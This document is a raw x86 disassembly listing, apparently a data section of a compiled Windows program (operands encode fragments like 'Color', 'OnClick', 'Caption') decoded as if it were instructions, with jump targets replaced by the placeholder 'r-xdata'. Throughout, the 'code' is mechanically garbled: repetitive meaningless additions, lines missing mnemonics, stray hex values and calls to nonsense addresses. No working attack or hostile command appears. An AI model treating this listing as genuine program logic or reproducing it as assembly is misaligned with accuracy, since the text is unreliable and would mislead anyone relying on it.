add [ eax ] 0x0
add [ eax + 0x410d0012 ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
mov ch 0x44
add [ ecx ] ah
add bh bh
outsd
insb
xor al 0xad
inc esp
add [ ebx ] bl
add bh bh
sbb ah bh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ eax ] ch
add eax [ eax ]
dec [ eax ]
xor eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
pop ss
add [ edx ] cl
inc ecx
jne r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
sub [ ebx ] eax
add bh bh
sbb al 0x35
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc eax 0x6c410f00
jo r-xdata
0x2710043 0xff00
mov eax 0xa80043f2
test [ ebx ] 0x0
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp [ eax ]
add [ eax ] al
sbb [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add [ eax ] al
sbb [ esi ] 0x0
or al 0x43
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax + eax ]
outsd
mov esp 0x610044b5
add [ eax ] al
dec [ ecx + edi * 8 - 0x557ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
xor eax 0x10044
add ah ah
loopne r-xdata
add al bl
jecxz r-xdata
movsb [ edi ] [ esi ]
jecxz r-xdata
insb
fadd st6
inc esp
add [ ecx + eax - 0x783b0100 ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
mov esp 0xa80043f0
test [ ebx ] 0x0
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bl
add bh bh
inc eax
int3
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sub [ edx ] eax
jo r-xdata
add ah ah
loopne r-xdata
add [ eax + 0x430b001f ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307001d ] al
popad
jo r-xdata
jb r-xdata
fadd [ ecx ]
add bh bh
and [ ecx + 0x45 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x30 ] 0x8f0044b5
add [ eax ] al
dec [ edi + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popfd
inc ebx
add [ ecx + 0x2 ] bh
add bh bh
jns r-xdata
in al 0x87
inc ebp
add [ eax ] cl
mov [ ebp ] al
outsb
je r-xdata
popad
outsb
insb
add bh bh
or [ edx ] cl
inc ebp
add [ edx + ecx + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050020 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
dec [ eax ]
or al [ ebp ]
push esp
or al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
add eax 0x6f6c6f43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax ] dl
add al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001e ] al
inc ebx
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
xchg esp eax
or [ ebp ] al
les ecx [ eax ]
inc ebp
add [ eax + 0x43f6 ] ch
and [ eax ] eax
adc [ edx + esi * 2 + 0x61 ] dl
outsb
jae r-xdata
push eax
add eax [ eax ]
inc [ ebp + esi + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
push esp
add al [ ebp ]
fsub st3
inc ebx
arpl [ edi + 0x6e ] bp
jae r-xdata
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0023 ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
push 0x38fe0000
das
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
or dl [ eax + 0x61 ]
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
jb r-xdata
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add bl bl
add [ eax ] eax
call [ eax + ecx * 4 + 0x10045 ]
add [ eax + eax ] ah
jae r-xdata
sub [ edx ] eax
push esp
add eax [ eax ]
push [ eax ]
xor eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ eax ]
adc eax 0x6e617254
sub [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
inc esp
and eax 0x73550e00
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax + 0x284ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
dec eax
insb
jo r-xdata
outsb
je r-xdata
mov ah 0x44
add [ ebp ] bl
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
outsd
outsb
add [ eax ] al
add [ es : esi ] cl
inc esp
popa
jne r-xdata
add eax [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add cl bl
add [ eax ] eax
jmp esp
and al 0x0
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
dec ecx
imul ebp [ ebp + 0x70 ] 0x50004396
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
popad
insb
jne r-xdata
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
or cl [ ebx + 0x65 ]
jns r-xdata
add bh bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000f ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060006 ] al
add bh bh
fdiv st6
inc ebx
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x6f460900
jb r-xdata
inc edx
add [ eax ] ch
add bh bh
mov [ ecx ] cl
inc ebp
add [ eax + 0x4509 ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604002c ] al
outsd
outsb
je r-xdata
mov dh 0x44
add [ eax + eax ] dh
push [ eax + 0x1004533 ]
add [ eax ] al
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
jb r-xdata
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040032 ] al
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
jb r-xdata
fwait
inc ebx
add [ edi + 0x2 ] dh
add [ eax ] al
popad
je r-xdata
popad
jbe r-xdata
adc [ eax ] al
jl r-xdata
loopne r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] dh
add bh bh
jne r-xdata
cmp [ edx ] al
mov [ edx ] al
add bh bh
pushfd
test [ ebx ] 0xb0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002f ] al
add [ eax + 0x43f6 ] dh
inc eax
add [ eax + eax ] cl
inc eax
inc [ eax + eax - 0xc ]
insb
cmp al 0x10
mov [ gs : edx + 0x3340043 ] ah
outsb
arpl [ eax + 0x4c ] bp
aaa
inc ebx
add [ eax + 0x48ff0000 ] al
or [ ebp ] al
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jb r-xdata
ja r-xdata
jl r-xdata
add bh bh
add eax [ eax ]
dec [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebp + 0x2 ] bh
add bh bh
jge r-xdata
jo r-xdata
add bh bh
push eax
cld
inc ebx
add [ ecx ] al
inc ebx
add [ ebx + eax ] dh
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : 0x65786950 ] cl
jb r-xdata
jbe r-xdata
das
inc ebx
add [ eax - 0x3700fffe ] ch
clc
inc ebx
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
test [ ebx ] 0x0
mov eax 0x1a00044
add bh bh
mov [ ecx + 0x10045 ] ds
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
pop es
push eax
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
nop
add al [ eax ]
call [ ecx + edi * 8 ]
inc ebx
insb
inc ebx
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
dec edi
add bh bh
adc [ eax ] 0x0
outsb
cmp eax 0x63530a00
jb r-xdata
add [ eax - 0x3fffbc04 ] dh
cld
inc ebx
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp al 0x0
push es
popad
jb r-xdata
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add bh bh
nop
outsb
jne r-xdata
js r-xdata
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec [ esp ]
inc ebx
add [ eax + 0x452f ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ edi ] al
adc [ eax ] al
lea eax [ eax ]
add bh bh
in al 0x9
inc ebp
add [ ecx + ecx + 0x45 ] ch
add [ eax - 0x80000000 ] al
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
push ebx
arpl [ ecx + 0x6c ] sp
add [ fs : eax ] dl
inc eax
add [ eax + 0x3 ] cl
add bh bh
dec eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add al [ eax ]
jmp eax
inc ebx
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
cmp al [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
lahf
inc ebx
add [ eax ] dh
add eax [ eax ]
add [ eax + 0x500b0039 ] al
outsd
jo r-xdata
add [ eax ] al
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090037 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
jo r-xdata
mov ah 0xfd
inc ebx
add [ eax + 0x43f6 ] ch
add bh bh
or eax 0x74726556
adc [ eax ] al
adc [ eax ] al
dec esp
add eax [ eax ]
dec [ ebx + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
aas
add [ edx ] cl
push ebx
outsb
popad
jo r-xdata
add [ eax ] al
push r-xdata
add [ eax ] 0x0
dec [ eax + 0x8 ]
inc ebp
add [ eax + 0x43f6 ] ch
pushfd
inc ebx
add [ eax + 0x2 ] bh
add bh bh
loopne r-xdata
je r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax 0x61500e00
jb r-xdata
dec edi
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
nop
das
inc ebx
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
dec [ edi + edi * 8 - 0x1f0bffbc ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050005 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ eax ] al
jne r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
outsb
sbb [ ebp + 0x27d0043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] al
or [ eax + 0x6f ] edx
jo r-xdata
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
inc edx
outsw
jb r-xdata
pop es
outsb
inc ecx
add al dl
add al [ eax ]
call eax
add al [ eax ]
[ eax + 0x43f6 ]
jae r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
inc eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0036 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
cmp bl bh
inc ebx
add [ eax + 0x43fb ] ah
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push esp
sahf
inc ebx
add al ah
add al [ eax ]
jmp eax
add [ eax ] al
add [ ebp ] 0x7
dec edi
outsb
inc ebx
nop
mov [ eax + eax + 0x30 ] 0x30ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000e ] al
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ ebx ] cl
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
push [ ebp + edi * 8 - 0x957ffbd ]
inc ebx
add [ eax ] al
xchg esi eax
inc ebx
add [ edx + eax ] dl
dec [ esp + ecx * 8 - 0x957ffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d0010 ] al
jb r-xdata
popfd
inc ebx
outsd
add [ eax + 0x4f09004c ] al
outsb
inc esp
jae r-xdata
js r-xdata
outsd
jae r-xdata
outsd
outsb
or [ edi + 0xb00044 ] bh
add bh bh
mov al 0x0
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
add [ eax - 0x1300fffe ] ah
clc
inc ebx
add [ eax + 0x43f6 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a0042 ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
adc [ esp + eax * 2 + 0xd800 ] bh
jb r-xdata
add al ch
add al [ eax ]
push eax
outsd
jo r-xdata
jne r-xdata
jpe r-xdata
jbe r-xdata
jns r-xdata
call 0xffffffffa942adf6
test [ ebx ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004d ] al
jo r-xdata
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08004a ] al
outsb
inc ebx
jb r-xdata
jb r-xdata
push ecx
mov [ esi + 0x41 ] gs
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
[ eax + 0x43f6 ]
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc ecx
dec edi
int3
[ eax + 0x43f6 ]
outsb
inc ecx
add [ eax ] bl
add eax [ eax ]
[ eax ]
add eax [ eax ]
[ eax + 0x43f6 ]
outsb
inc esp
popad
add [ edi + ecx * 2 ] cl
popad
je r-xdata
mov [ gs : esi + 0x41 ] gs
js r-xdata
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x8c6f666e
outsb
inc ecx
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
mov esp 0xd80044
add bh bh
fadd [ eax ]
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0053 ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
mov [ esi + 0x41 ] gs
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070046 ] al
outsb
inc ebx
insb
inc esp
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130048 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add al bh
add al [ eax ]
outsb
outsw
mov [ esi + 0x41 ] gs
jo r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
popad
je r-xdata
dec esp
mov ebx 0x2100044
add bh bh
adc [ edx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0057 ] al
outsb
dec ebx
jns r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
popad
mov ebx 0xe00044
add bh bh
loopne r-xdata
[ eax + 0x43f6 ]
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jae r-xdata
inc ebp
outsb
je r-xdata
jne r-xdata
mov edx 0x1280044
pop esp
add [ edi + ecx * 2 ] cl
insb
mov ecx 0xc00044
add bh bh
rol [ eax ] 0x0
[ eax + 0x43f6 ]
jb r-xdata
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0051 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0061 ] al
outsb
dec ebp
push ebp
sbb [ esi ] 0x9
dec edi
jb r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push 0x906c6565
rol [ eax + eax + 0x48 ] 0x1
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec esp
popad
jbe r-xdata
sbb [ edx ] 0xb
dec edi
outsb
dec ebp
outsd
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
outsb
inc ecx
push edi
push 0x556c6565
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c005f ] al
rol [ eax + eax + 0x40 ] 0x1
add bh bh
outsd
jne r-xdata
jo r-xdata
push ebp
add bh bh
sub [ ecx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0059 ] al
outsb
dec ebp
outsd
jne r-xdata
sub [ ecx ] al
outsb
outsb
inc ecx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c005c ] al
add [ eax + 0x4f100060 ] al
outsb
dec ebp
outsd
jbe r-xdata
mov [ esi + 0x41 ] gs
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
in al 0xb9
inc esp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
[ eax + 0x43f6 ]
add [ eax ] bh
add [ eax ] eax
outsb
inc ecx
add [ ebx + 0x2180044 ] bh
add bh bh
sbb [ edx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
mov ebx 0x2080044
add bh bh
or [ edx ] al
push esp
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp - 0x2c ] 0xf000439e
add al [ eax ]
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060055 ] al
outsb
dec eax
insb
jo r-xdata
jb r-xdata
inc eax
outsb
inc ecx
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
[ eax + 0x43f6 ]
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
call 0xffffffffe942b129
add [ eax ] al
[ eax + 0x43f6 ]
push edi
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
outsb
dec ebp
outsd
jne r-xdata
insb
mov ecx 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005e ] al
je r-xdata
jpe r-xdata
cwde
sahf
inc ebx
add [ eax ] cl
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0064 ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
nop
rol [ eax + eax + 0x50 ] 0x1
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x7c ] bp
mov esi 0x2000044
add bh bh
add [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ 0x65476e4f ] cl
je r-xdata
mov esp 0xf80044
add bh bh
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090052 ] al
outsb
and al 0xb3
inc ebx
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax + 0x3 ] ah
add [ eax ] al
insb
lahf
inc ebx
add [ eax + 0x7 ] dl
inc edx
add [ eax - 0x5bffbc2d ] ah
aad 0x43
outsd
arpl [ ebx - 0x3c ] bp
mov ebp 0x2200044
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ bx + si ] cl
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax ] 0xb2
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
[ eax + 0x43f6 ]
mov [ esi + 0x41 ] gs
add ah al
xchg ecx eax
inc ebp
add al bl
fadd [ ebx ]
inc eax
sahf
inc ecx
add [ edi + esi - 0x2797ffbc ] ah
inc ebx
add [ ecx + ebx * 8 + 0x67c0043 ] ah
inc ebp
add [ eax + 0x7 ] ch
inc edx
add [ esi ] al
inc ebx
add [ esp + eax + 0x42 ] al
add [ ebx + esi + 0x362c0044 ] ch
inc esp
add al ch
mov eax [ ebp ]
hlt
inc esp
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 ] ah
add [ eax + ecx * 2 + 0xa6c0040 ] ch
inc esp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + edx * 8 ] cl
inc ebx
inc ebx
jb r-xdata
sub_43ae0f
mov esp 0x1e00044
add bh bh
loopne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004e ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ edx ] cl
dec edi
jb r-xdata
jo r-xdata
mov esp 0xf80044
add bh bh
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090052 ] al
outsb
add [ eax ] al
add [ eax - 0x80000000 ] al
push eax
add [ edx ] cl
mov ebp 0x1e80044
add bh bh
call 0x242ae41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004f ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x8c6f666e
outsb
inc ecx
add [ eax ] 0x0
add [ eax + 0x4f0d0053 ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x7c ] bp
mov esi 0x2000044
add bh bh
add [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ 0x65476e4f ] cl
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add al bh
add al [ eax ]
outsb
outsw
mov [ esi + 0x41 ] gs
jo r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
mov esp 0xd80044
add bh bh
fadd [ eax ]
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
popad
je r-xdata
dec esp
mov ebx 0x2100044
add bh bh
adc [ edx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0057 ] al
outsb
dec ebx
jns r-xdata
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
